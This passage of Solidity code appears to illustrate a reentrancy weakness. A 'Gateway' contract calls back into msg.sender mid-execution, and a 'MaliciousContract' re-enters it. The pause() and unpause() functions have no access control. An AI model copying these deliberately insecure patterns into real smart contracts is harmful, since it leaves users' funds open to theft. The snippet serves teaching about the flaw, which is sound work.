    bool public paused;
    constructor() {
        paused = false;
    }
    modifier pauseable {
        require(!paused, "Gateway is paused");
        _;
    }
    function pause() public {
        paused = true;
    }
    function unpause() public {
        paused = false;
    }
    // Vulnerable function that uses the pauseable modifier
    function vulnerableFunction() public pauseable {
        // Perform some state changes here
        // External call to MaliciousContract's attack function
        MaliciousContract attacker = MaliciousContract(msg.sender);
        attacker.attack();        
        // More state changes here
    }
}
// Malicious contract
contract MaliciousContract {
    Gateway public gateway;
    constructor(address gatewayAddress) {
        gateway = Gateway(gatewayAddress);
    }
    // Malicious function that exploits the reentrancy vulnerability
    function attack() public {
        // The attacker can repeatedly call vulnerableFunction
        // while it's executing to trigger the reentrancy issue
        gateway.vulnerableFunction();
    }
}
